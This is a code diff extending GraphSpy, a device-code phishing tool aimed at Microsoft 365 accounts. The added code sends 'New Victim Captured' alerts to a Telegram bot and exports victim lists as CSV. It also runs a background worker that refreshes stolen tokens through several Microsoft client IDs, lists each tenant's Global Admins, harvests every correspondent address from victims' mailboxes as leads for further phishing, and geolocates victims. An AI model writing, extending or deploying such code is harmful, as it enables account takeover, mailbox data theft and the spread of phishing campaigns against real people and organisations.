@@ -94,7 +94,7 @@ def list_databases():
     return databases
 
 def update_db():
-    latest_schema_version = "6"
+    latest_schema_version = "7"
     current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
     if current_schema_version == "1":
         print("[*] Current database is schema version 1, updating to schema version 2")
@@ -133,6 +133,13 @@ def update_db():
         execute_db("ALTER TABLE devicecodes ADD COLUMN auto_target_domain TEXT")
         execute_db("UPDATE settings SET value = '6' WHERE setting = 'schema_version'")
         print("[*] Updated database to schema version 6")
+        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
+    if current_schema_version == "6":
+        print("[*] Current database is schema version 6, updating to schema version 7")
+        execute_db('CREATE TABLE IF NOT EXISTS cached_admins (id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT UNIQUE, admins_json TEXT, fetched_at TEXT)')
+        execute_db('CREATE TABLE IF NOT EXISTS email_leads (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, lead_email TEXT, lead_name TEXT, source TEXT, first_seen TEXT, UNIQUE(user_email, lead_email))')
+        execute_db("UPDATE settings SET value = '7' WHERE setting = 'schema_version'")
+        print("[*] Updated database to schema version 7")
         current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
 
 
@@ -456,6 +463,12 @@ def poll_device_codes():
                         user = decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken else decoded_accesstoken["appid"] if "appid" in decoded_accesstoken else "unknown"
                     else:
                         user = "unknown"
+                    # Send Telegram notification
+                    try:
+                        ip_addr = decoded_accesstoken.get("ipaddr", "unknown")
+                        send_telegram_notification(user, ip_addr)
+                    except:
+                        pass
                     refresh_token_id = save_refresh_token(
                         response.json()["refresh_token"], 
                         f"Created using device code auth ({user_code})", 
@@ -1511,11 +1524,302 @@ def safe_join(directory, filename):
 
 def init_routes():
 
+    # ========== Telegram Notifications ==========
+
+    def send_telegram_notification(email, ip_addr):
+        """Send a Telegram notification when a new victim authenticates."""
+        try:
+            bot_token = query_db("SELECT value FROM settings WHERE setting = 'tg_bot_token'", one=True)
+            chat_id = query_db("SELECT value FROM settings WHERE setting = 'tg_chat_id'", one=True)
+            if not bot_token or not chat_id or not bot_token[0] or not chat_id[0]:
+                return
+            from datetime import datetime
+            msg = f"🎯 New Victim Captured\n\n📧 {email}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n🌐 IP: {ip_addr}"
+            url = f"https://api.telegram.org/bot{bot_token[0]}/sendMessage"
+            requests.post(url, data={"chat_id": chat_id[0], "text": msg, "parse_mode": "HTML"}, timeout=5)
+        except:
+            pass
+
+    @app.route("/api/get_telegram")
+    def api_get_telegram():
+        bot = query_db("SELECT value FROM settings WHERE setting = 'tg_bot_token'", one=True)
+        chat = query_db("SELECT value FROM settings WHERE setting = 'tg_chat_id'", one=True)
+        return json.dumps({"bot_token": bot[0] if bot else "", "chat_id": chat[0] if chat else ""})
+
+    @app.post("/api/set_telegram")
+    def api_set_telegram():
+        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('tg_bot_token', ?)", (request.form.get('bot_token', ''),))
+        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('tg_chat_id', ?)", (request.form.get('chat_id', ''),))
+        return "saved"
+
+    @app.post("/api/test_telegram")
+    def api_test_telegram():
+        try:
+            bot_token = request.form.get('bot_token', '')
+            chat_id = request.form.get('chat_id', '')
+            msg = "✅ GraphSpy Telegram test — notifications are working!"
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            r = requests.post(url, data={"chat_id": chat_id, "text": msg}, timeout=5)
+            return "sent" if r.status_code == 200 else f"error: {r.text[:100]}", r.status_code
+        except Exception as e:
+            return str(e), 500
+
+    # ========== Authentication ==========
+
+    import hashlib
+    app.secret_key = os.urandom(32)
+
+    def get_panel_password():
+        """Get the panel password from settings, or return None if not set."""
+        try:
+            row = query_db("SELECT value FROM settings WHERE setting = 'panel_password'", one=True)
+            return row[0] if row else None
+        except:
+            return None
+
+    @app.before_request
+    def require_login():
+        """Protect all pages if password is set."""
+        from flask import session
+        # Always allow these paths
+        exempt = ['/login', '/static/', '/api/remote/', '/api/open/']
+        if any(request.path.startswith(e) for e in exempt):
+            return
+        # Check if password protection is enabled
+        try:
+            pwd = get_panel_password()
+        except:
+            return  # No password set or DB error = open access
+        if not pwd:
+            return  # No password set = open access
+        # Password is set — check session
+        if not session.get('authenticated', False):
+            return redirect('/login')
+
+    @app.route("/login", methods=["GET", "POST"])
+    def login():
+        from flask import session
+        pwd = get_panel_password()
+        if not pwd:
+            session['authenticated'] = True
+            return redirect('/')
+        if request.method == "POST":
+            entered = request.form.get('password', '')
+            hashed = hashlib.sha256(entered.encode()).hexdigest()
+            if hashed == pwd:
+                session['authenticated'] = True
+                return redirect('/')
+            return render_template('login.html', title="Login", error="Wrong password")
+        return render_template('login.html', title="Login", error=None)
+
+    @app.route("/logout")
+    def logout():
+        from flask import session
+        session.pop('authenticated', None)
+        return redirect('/login')
+
+    @app.route("/api/set_panel_password", methods=["POST"])
+    def api_set_panel_password():
+        new_pwd = request.form.get('password', '')
+        if new_pwd:
+            hashed = hashlib.sha256(new_pwd.encode()).hexdigest()
+            execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('panel_password', ?)", (hashed,))
+            return "Password set", 200
+        else:
+            execute_db("DELETE FROM settings WHERE setting = 'panel_password'")
+            from flask import session
+            session['authenticated'] = True
+            return "Password removed", 200
+
     # ========== Pages ==========
 
     @app.route("/")
+    @app.route("/users")
+    def users_home():
+        return render_template('users_table.html', title="Users")
+
+    @app.route("/settings")
     def settings():
         return render_template('settings.html', title="Settings")
+
+    # ========== Users API ==========
+
+    @app.route("/api/list_users")
+    def api_list_users():
+        """Return deduplicated user list from access + refresh tokens."""
+        users = {}
+        # Gather from access tokens
+        rows = query_db_json("SELECT * FROM accesstokens")
+        for row in rows:
+            token_str = row.get("accesstoken", "")
+            user_email = row.get("user", "unknown")
+            resource = row.get("resource", "")
+            if not user_email or user_email == "unknown":
+                continue
+            if user_email not in users:
+                users[user_email] = {"email": user_email, "name": "", "access_token_id": 0, "refresh_token_id": 0, "resource": "", "stored_at": "", "scopes": "", "country": ""}
+            # Prefer graph-scoped tokens
+            if "graph.microsoft.com" in resource or users[user_email]["access_token_id"] == 0:
+                users[user_email]["access_token_id"] = row["id"]
+                users[user_email]["resource"] = resource
+                users[user_email]["stored_at"] = row.get("stored_at", "")
+            # Try to decode name, scopes, and country from token
+            try:
+                decoded = jwt.decode(token_str, options={"verify_signature": False})
+                name = decoded.get("name", "")
+                if name and not users[user_email]["name"]:
+                    users[user_email]["name"] = name
+                scp = decoded.get("scp", "")
+                if scp and (not users[user_email]["scopes"] or "graph.microsoft.com" in resource):
+                    users[user_email]["scopes"] = scp
+                # Extract country from ipaddr via cached GeoIP, fallback to ctry claim
+                ipaddr = decoded.get("ipaddr", "")
+                if ipaddr:
+                    # Check cache in settings table
+                    cached_cc = query_db("SELECT value FROM settings WHERE setting = ?", [f"ip_country_{ipaddr}"], one=True)
+                    if cached_cc:
+                        users[user_email]["country"] = cached_cc[0]
+                if not users[user_email]["country"]:
+                    country = decoded.get("ctry", "") or decoded.get("country", "")
+                    if country:
+                        users[user_email]["country"] = country
+            except:
+                pass
+        # Gather refresh token IDs
+        rt_rows = query_db_json("SELECT * FROM refreshtokens")
+        for row in rt_rows:
+            user_email = row.get("user", "")
+            if user_email in users:
+                # Prefer the latest refresh token
+                if row["id"] > users[user_email]["refresh_token_id"]:
+                    users[user_email]["refresh_token_id"] = row["id"]
+        # Add admin count and leads count per user
+        for email, u in users.items():
+            domain = email.split("@")[1] if "@" in email else ""
+            # Admin count
+            try:
+                admin_row = query_db("SELECT admins_json FROM cached_admins WHERE domain = ?", [domain], one=True)
+                if admin_row and admin_row[0]:
+                    admins = json.loads(admin_row[0])
+                    u["admin_count"] = len([a for a in admins if not a.get("error")])
+                else:
+                    u["admin_count"] = 0
+            except:
+                u["admin_count"] = 0
+            # Email leads count
+            try:
+                leads_row = query_db("SELECT COUNT(*) FROM email_leads WHERE user_email = ?", [email], one=True)
+                u["leads_count"] = leads_row[0] if leads_row else 0
+            except:
+                u["leads_count"] = 0
+        return json.dumps(list(users.values()))
+
+    @app.route("/api/download_db")
+    def api_download_db():
+        """Download the ENTIRE GraphSpy database file."""
+        db_path = app.config['graph_spy_db_path']
+        return flask.helpers.send_file(db_path, as_attachment=True, download_name=os.path.basename(db_path))
+
+    # ========== Cached Global Admins ==========
+
+    @app.route("/api/cached_admins/<domain>")
+    def api_get_cached_admins(domain):
+        """Get cached global admins for a domain. Returns null if not cached."""
+        row = query_db_json("SELECT * FROM cached_admins WHERE domain = ?", [domain], one=True)
+        if row:
+            return json.dumps({"domain": row["domain"], "admins": json.loads(row["admins_json"]), "fetched_at": row["fetched_at"]})
+        return json.dumps(None)
+
+    @app.post("/api/cached_admins/<domain>")
+    def api_save_cached_admins(domain):
+        """Save global admins for a domain."""
+        admins = request.form.get("admins_json", "[]")
+        from datetime import datetime
+        now = datetime.now().isoformat()
+        execute_db("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)", (domain, admins, now))
+        return "saved"
+
+    # ========== Email Leads ==========
+
+    @app.route("/api/email_leads/<user_email>")
+    def api_get_email_leads(user_email):
+        """Get all cached email leads for a user."""
+        rows = query_db_json("SELECT * FROM email_leads WHERE user_email = ?", [user_email])
+        return json.dumps(rows)
+
+    @app.post("/api/email_leads/save")
+    def api_save_email_leads():
+        """Save a batch of email leads."""
+        data = request.get_json() or {}
+        user_email = data.get("user_email", "")
+        leads = data.get("leads", [])
+        from datetime import datetime
+        now = datetime.now().isoformat()
+        saved = 0
+        for lead in leads:
+            try:
+                execute_db("INSERT OR IGNORE INTO email_leads (user_email, lead_email, lead_name, source, first_seen) VALUES (?, ?, ?, ?, ?)",
+                    (user_email, lead.get("email",""), lead.get("name",""), lead.get("source",""), now))
+                saved += 1
+            except:
+                pass
+        return json.dumps({"saved": saved})
+
+    @app.route("/api/email_leads/last_enriched/<user_email>")
+    def api_email_leads_last_enriched(user_email):
+        """Check when leads were last enriched."""
+        row = query_db("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [user_email], one=True)
+        return json.dumps({"last": row[0] if row and row[0] else None})
+
+    # ========== Cloudflare Settings ==========
+
+    @app.route("/api/get_cf_settings")
+    def api_get_cf_settings():
+        """Get Cloudflare credentials from settings."""
+        token = query_db("SELECT value FROM settings WHERE setting = 'cf_api_token'", one=True)
+        account = query_db("SELECT value FROM settings WHERE setting = 'cf_account_id'", one=True)
+        return json.dumps({
+            "api_token": token[0] if token else "",
+            "account_id": account[0] if account else ""
+        })
+
+    @app.post("/api/set_cf_settings")
+    def api_set_cf_settings():
+        """Save Cloudflare credentials to settings."""
+        token = request.form.get("api_token", "")
+        account = request.form.get("account_id", "")
+        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('cf_api_token', ?)", (token,))
+        execute_db("INSERT OR REPLACE INTO settings (setting, value) VALUES ('cf_account_id', ?)", (account,))
+        return "saved"
+
+    @app.route("/api/download_victims_csv")
+    def api_download_victims_csv():
+        """Download victims list as CSV."""
+        users = {}
+        rows = query_db_json("SELECT * FROM accesstokens")
+        for row in rows:
+            user_email = row.get("user", "unknown")
+            if not user_email or user_email == "unknown":
+                continue
+            if user_email not in users:
+                users[user_email] = {"email": user_email, "name": "", "resource": "", "stored_at": ""}
+            try:
+                decoded = jwt.decode(row.get("accesstoken", ""), options={"verify_signature": False})
+                name = decoded.get("name", "")
+                if name and not users[user_email]["name"]:
+                    users[user_email]["name"] = name
+            except:
+                pass
+            users[user_email]["stored_at"] = row.get("stored_at", "")
+            users[user_email]["resource"] = row.get("resource", "")
+        csv = "Email,Name,Resource,Captured At\n"
+        for u in users.values():
+            csv += f'"{u["email"]}","{u["name"]}","{u["resource"]}","{u["stored_at"]}"\n'
+        return csv, 200, {'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename=victims.csv'}
+
+    @app.route("/phish_generator")
+    def phish_generator():
+        return render_template('phish_generator.html', title="Phish Generator")
 
     @app.route("/access_tokens")
     def access_tokens():
@@ -1579,11 +1883,11 @@ def init_routes():
         
     @app.route("/outlook")
     def outlook():
-        return render_template('outlook.html', title="Outlook")
+        return render_template('outlook.html', title="Outlook Web")
 
     @app.route("/outlook_graph")
     def outlook_graph():
-        return render_template('outlook_graph.html', title="Outlook Graph")
+        return render_template('outlook_graph.html', title="Outlook")
         
     @app.route("/teams")
     def teams():
@@ -2830,6 +3134,356 @@ def main():
         update_db()
     # Disable datatable error messages by default.
     app.config['table_error_messages'] = "disabled"
+
+    # ========== Background Enrichment Thread ==========
+    def bg_enrichment_worker():
+        """Background thread: auto-enrich new victims with global admins + email leads.
+        Runs continuously. When victim count increases, enriches the new ones.
+        Uses smart wait on rate limits (no max retries — keeps trying until done)."""
+        import time as _time
+        known_users = set()
+        ip_country_cache = {}
+
+        def bg_db():
+            """Get a fresh DB connection for background thread (can't use Flask g)."""
+            return sqlite3.connect(app.config['graph_spy_db_path'])
+
+        def bg_query(query, args=(), one=False):
+            con = bg_db()
+            con.row_factory = sqlite3.Row
+            cur = con.execute(query, args)
+            rv = cur.fetchall()
+            cur.close()
+            con.close()
+            return (rv[0] if rv else None) if one else rv
+
+        def bg_execute(query, args=()):
+            con = bg_db()
+            con.execute(query, args)
+            con.commit()
+            con.close()
+
+        def bg_graph_request(uri, access_token_id):
+            """Make a Graph API call using a stored access token. Returns parsed JSON or None."""
+            try:
+                row = bg_query("SELECT accesstoken FROM accesstokens WHERE id = ?", [access_token_id], one=True)
+                if not row:
+                    return None
+                token = row[0]
+                headers = {"Authorization": f"Bearer {token}", "User-Agent": "GraphSpy/1.0"}
+                resp = requests.get(uri, headers=headers, timeout=30)
+                return resp.json() if resp.text else None
+            except Exception as e:
+                print(f"[ENRICH] Graph request error: {e}", flush=True)
+                return None
+
+        def get_best_token(email):
+            """Find or create a valid Graph-scoped access token for a user.
+            Tries existing tokens first, then refreshes with multiple client_ids until one works."""
+            # Try existing non-expired Graph tokens
+            rows = bg_query("SELECT id, accesstoken, resource FROM accesstokens WHERE user = ? ORDER BY id DESC", [email])
+            for row in rows:
+                if "graph.microsoft.com" in (row["resource"] or ""):
+                    try:
+                        decoded = jwt.decode(row["accesstoken"], options={"verify_signature": False})
+                        if decoded.get("exp", 0) > _time.time():
+                            return row["id"]
+                    except:
+                        pass
+            # All expired — try to refresh with multiple client_ids for best scopes
+            client_ids = [
+                "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office — Directory.Read.All + Mail.ReadWrite
+                "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
+                "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Auth Broker
+                "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  # Teams
+            ]
+            rt_rows = bg_query("SELECT id, client_id FROM refreshtokens WHERE user = ? ORDER BY id DESC", [email])
+            for cid in client_ids:
+                for rt in rt_rows:
+                    try:
+                        with app.app_context():
+                            result = refresh_to_access_token(rt["id"], cid, "https://graph.microsoft.com")
+                        if isinstance(result, (int, str)) and str(result).isdigit():
+                            print(f"[ENRICH] Refreshed token for {email} with client {cid[:8]}...", flush=True)
+                            return int(result)
+                    except:
+                        continue
+            print(f"[ENRICH] Could not get valid token for {email}", flush=True)
+            return None
+
+        def enrich_admins(email, tid):
+            """Fetch global admins for a user's domain. Auto-refreshes tokens. Never gives up (except insufficient_permissions)."""
+            domain = email.split("@")[1] if "@" in email else ""
+            if not domain:
+                return
+            # Check if already cached — but if cached with error (not insufficient_permissions), delete and re-fetch
+            cached = bg_query("SELECT admins_json FROM cached_admins WHERE domain = ?", [domain], one=True)
+            if cached:
+                try:
+                    admins = json.loads(cached[0])
+                    has_real = any(not a.get("error") for a in admins)
+                    is_perm_denied = any(a.get("error") == "insufficient_permissions" for a in admins)
+                    if has_real:
+                        return  # Already have real data
+                    if is_perm_denied:
+                        return  # Permanently no permission
+                    # Stale error cache — delete and re-fetch
+                    bg_execute("DELETE FROM cached_admins WHERE domain = ?", [domain])
+                    print(f"[ENRICH] Cleared stale error cache for {domain}", flush=True)
+                except:
+                    bg_execute("DELETE FROM cached_admins WHERE domain = ?", [domain])
+
+            print(f"[ENRICH] Fetching Global Admins for {domain}...", flush=True)
+            backoff = 5
+            while True:
+                data = bg_graph_request(
+                    f"https://graph.microsoft.com/v1.0/directoryRoles/roleTemplateId=62e90394-69f5-4237-9190-012177145e10/members?$select=displayName,userPrincipalName,mail",
+                    tid
+                )
+                if data is None:
+                    # No response — refresh token and retry
+                    print(f"[ENRICH] No response for {domain}, refreshing token...", flush=True)
+                    new_tid = get_best_token(email)
+                    if new_tid:
+                        tid = new_tid
+                    _time.sleep(backoff)
+                    backoff = min(backoff * 2, 120)
+                    continue
+                if "error" in data:
+                    code = data["error"].get("code", "")
+                    if code == "TooManyRequests":
+                        print(f"[ENRICH] Rate limited for {domain}, waiting {backoff}s...", flush=True)
+                        _time.sleep(backoff)
+                        backoff = min(backoff * 2, 300)
+                        continue
+                    elif code in ("Authorization_RequestDenied", "ErrorAccessDenied"):
+                        print(f"[ENRICH] No permission for {domain} admins — permanent, caching", flush=True)
+                        bg_execute("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)",
+                                   (domain, json.dumps([{"error": "insufficient_permissions"}]), datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")))
+                        return
+                    elif code in ("InvalidAuthenticationToken", "ExpiredToken", "Unauthorized"):
+                        # Token expired — refresh and retry immediately, never cache this error
+                        print(f"[ENRICH] Token expired for {domain}, refreshing...", flush=True)
+                        new_tid = get_best_token(email)
+                        if new_tid:
+                            tid = new_tid
+                            backoff = 5  # Reset backoff after fresh token
+                            continue
+                        # All refresh attempts failed — wait and try again later
+                        _time.sleep(30)
+                        new_tid = get_best_token(email)
+                        if new_tid:
+                            tid = new_tid
+                            continue
+                        print(f"[ENRICH] All tokens exhausted for {email}, will retry next cycle", flush=True)
+                        return  # DON'T cache — worker retries next cycle
+                    else:
+                        print(f"[ENRICH] Error for {domain}: {code}, retrying in {backoff}s...", flush=True)
+                        _time.sleep(backoff)
+                        backoff = min(backoff * 2, 120)
+                        continue
+                # Success — cache real admin list
+                members = data.get("value", [])
+                bg_execute("INSERT OR REPLACE INTO cached_admins (domain, admins_json, fetched_at) VALUES (?, ?, ?)",
+                           (domain, json.dumps(members), datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")))
+                print(f"[ENRICH] Cached {len(members)} Global Admin(s) for {domain}", flush=True)
+                return
+
+        def enrich_emails(email, tid):
+            """Extract email addresses from all folders. Only re-enrich after 7 days."""
+            # Check last enrichment
+            row = bg_query("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [email], one=True)
+            if row and row["last"]:
+                try:
+                    last_dt = datetime.strptime(row["last"], "%Y-%m-%d %H:%M:%S")
+                    days_since = (datetime.now() - last_dt).total_seconds() / 86400
+                    if days_since < 7:
+                        return  # Already enriched within 7 days
+                except:
+                    pass
+
+            print(f"[ENRICH] Extracting email leads for {email}...", flush=True)
+            leads = {}
+            backoff = 5
+            # Fetch from inbox messages (top 500)
+            uri = "https://graph.microsoft.com/v1.0/me/messages?$top=500&$select=from,toRecipients,ccRecipients&$orderby=receivedDateTime desc"
+            while uri:
+                data = bg_graph_request(uri, tid)
+                if data is None:
+                    _time.sleep(backoff)
+                    backoff = min(backoff * 2, 120)
+                    continue
+                if "error" in data:
+                    code = data["error"].get("code", "")
+                    if code == "TooManyRequests":
+                        print(f"[ENRICH] Rate limited for {email} emails, waiting {backoff}s...", flush=True)
+                        _time.sleep(backoff)
+                        backoff = min(backoff * 2, 300)
+                        continue
+                    elif code in ("InvalidAuthenticationToken", "ExpiredToken", "Unauthorized"):
+                        print(f"[ENRICH] Token expired for {email} emails, refreshing...", flush=True)
+                        new_tid = get_best_token(email)
+                        if new_tid:
+                            tid = new_tid
+                            backoff = 5
+                            continue
+                        # Wait and retry
+                        _time.sleep(30)
+                        new_tid = get_best_token(email)
+                        if new_tid:
+                            tid = new_tid
+                            continue
+                        print(f"[ENRICH] All tokens exhausted for {email} emails, retry next cycle", flush=True)
+                        return
+                    elif code in ("Authorization_RequestDenied", "ErrorAccessDenied"):
+                        print(f"[ENRICH] No mail permission for {email} — permanent", flush=True)
+                        return
+                    else:
+                        print(f"[ENRICH] Email leads error for {email}: {code}, retrying...", flush=True)
+                        _time.sleep(backoff)
+                        backoff = min(backoff * 2, 120)
+                        continue
+                for msg in data.get("value", []):
+                    if msg.get("from", {}).get("emailAddress"):
+                        addr = msg["from"]["emailAddress"].get("address", "").lower()
+                        name = msg["from"]["emailAddress"].get("name", "")
+                        if addr:
+                            leads[addr] = {"name": name, "source": "from"}
+                    for field in ("toRecipients", "ccRecipients"):
+                        for r in msg.get(field, []):
+                            if r.get("emailAddress"):
+                                addr = r["emailAddress"].get("address", "").lower()
+                                name = r["emailAddress"].get("name", "")
+                                if addr:
+                                    leads[addr] = {"name": name, "source": field}
+                uri = data.get("@odata.nextLink")
+                if uri:
+                    _time.sleep(1)  # Gentle pacing
+
+            # Save leads to DB
+            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            con = bg_db()
+            for addr, info in leads.items():
+                try:
+                    con.execute("INSERT OR IGNORE INTO email_leads (user_email, lead_email, lead_name, source, first_seen) VALUES (?, ?, ?, ?, ?)",
+                                (email, addr, info["name"], info["source"], now))
+                except:
+                    pass
+            con.commit()
+            con.close()
+            print(f"[ENRICH] Stored {len(leads)} email leads for {email}", flush=True)
+
+        def resolve_ip_country(ip):
+            """Resolve IP to country code via free GeoIP API. Cache results."""
+            if not ip or ip in ip_country_cache:
+                return ip_country_cache.get(ip, "")
+            try:
+                resp = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=5)
+                data = resp.json()
+                cc = data.get("countryCode", "")
+                ip_country_cache[ip] = cc
+                if cc:
+                    bg_execute("INSERT OR REPLACE INTO settings (setting, value) VALUES (?, ?)", (f"ip_country_{ip}", cc))
+                return cc
+            except:
+                return ""
+
+        def worker_loop():
+            _time.sleep(10)  # Wait for Flask to fully start
+            print("[ENRICH] Background enrichment worker started", flush=True)
+            # Clear stale error caches (not insufficient_permissions — those are permanent)
+            try:
+                stale = bg_query("SELECT domain, admins_json FROM cached_admins")
+                for row in stale:
+                    try:
+                        admins = json.loads(row["admins_json"])
+                        has_real = any(not a.get("error") for a in admins)
+                        is_perm = any(a.get("error") == "insufficient_permissions" for a in admins)
+                        if not has_real and not is_perm:
+                            bg_execute("DELETE FROM cached_admins WHERE domain = ?", [row["domain"]])
+                            print(f"[ENRICH] Cleared stale cache for {row['domain']}", flush=True)
+                    except:
+                        bg_execute("DELETE FROM cached_admins WHERE domain = ?", [row["domain"]])
+            except Exception as e:
+                print(f"[ENRICH] Cache cleanup error: {e}", flush=True)
+            first_run = True
+            while True:
+                try:
+                    # Get all unique users
+                    rows = bg_query("SELECT DISTINCT user FROM accesstokens WHERE user != 'unknown' AND user != ''")
+                    current_users = set(row["user"] for row in rows)
+
+                    # On first run, process ALL users (resolve IPs, check missing enrichments)
+                    if first_run:
+                        new_users = current_users
+                        first_run = False
+                    else:
+                        new_users = current_users - known_users
+
+                    if new_users:
+                        print(f"[ENRICH] {len(new_users)} user(s) to process: {', '.join(new_users)}", flush=True)
+
+                    for email in new_users:
+                        tid = get_best_token(email)
+                        if not tid:
+                            print(f"[ENRICH] No valid token for {email}, will retry next cycle", flush=True)
+                            continue
+
+                        # Enrich admins
+                        try:
+                            enrich_admins(email, tid)
+                        except Exception as e:
+                            print(f"[ENRICH] Admin enrichment error for {email}: {e}", flush=True)
+
+                        _time.sleep(2)  # Pause between tasks
+
+                        # Enrich email leads
+                        try:
+                            enrich_emails(email, tid)
+                        except Exception as e:
+                            print(f"[ENRICH] Email leads error for {email}: {e}", flush=True)
+
+                        _time.sleep(2)  # Pause between users
+
+                        # Resolve IP country
+                        try:
+                            at_rows = bg_query("SELECT accesstoken FROM accesstokens WHERE user = ? ORDER BY id DESC LIMIT 1", [email])
+                            if at_rows:
+                                decoded = jwt.decode(at_rows[0]["accesstoken"], options={"verify_signature": False})
+                                ip = decoded.get("ipaddr", "")
+                                if ip:
+                                    resolve_ip_country(ip)
+                        except:
+                            pass
+
+                    known_users.update(new_users)
+
+                    # Also check for users that need weekly re-enrichment of email leads
+                    for email in current_users:
+                        try:
+                            row = bg_query("SELECT MAX(first_seen) as last FROM email_leads WHERE user_email = ?", [email], one=True)
+                            if row and row["last"]:
+                                last_dt = datetime.strptime(row["last"], "%Y-%m-%d %H:%M:%S")
+                                days_since = (datetime.now() - last_dt).total_seconds() / 86400
+                                if days_since >= 7:
+                                    tid = get_best_token(email)
+                                    if tid:
+                                        print(f"[ENRICH] Weekly re-enrichment for {email}", flush=True)
+                                        enrich_emails(email, tid)
+                        except:
+                            pass
+
+                except Exception as e:
+                    print(f"[ENRICH] Worker error: {e}", flush=True)
+
+                _time.sleep(30)  # Check every 30 seconds
+
+        enrichment_thread = Thread(target=worker_loop, daemon=True)
+        enrichment_thread.start()
+        print("[*] Background enrichment worker started.")
+
+    bg_enrichment_worker()
+
     # Run flask
     print(f"[*] Starting GraphSpy. Open in your browser by going to the url displayed below.\n")
     app.run(debug=args.debug, host=args.interface, port=args.port)
